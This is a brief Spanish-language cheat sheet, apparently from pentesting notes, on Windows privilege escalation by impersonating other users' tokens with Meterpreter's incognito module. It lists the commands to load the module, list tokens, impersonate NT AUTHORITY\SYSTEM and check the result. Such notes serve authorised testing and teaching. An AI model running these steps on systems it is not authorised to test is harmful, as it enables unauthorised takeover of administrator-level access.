Técnica para escalar privilegios impersonando tokens de otros usuarios.

• Permite asumir identidad de usuarios privilegiados  
• Requiere tokens disponibles en el sistema  
• Común en sistemas Windows

## Cargar módulo

```
load incognito
```

## Listar tokens

Muestra tokens disponibles para impersonar.

```
list_tokens -u 
```

## Impersonar token

Permite tomar identidad de otro usuario.

```
impersonate_token "NT AUTHORITY\\SYSTEM"
```

## Verificar privilegios

```
getuid
```
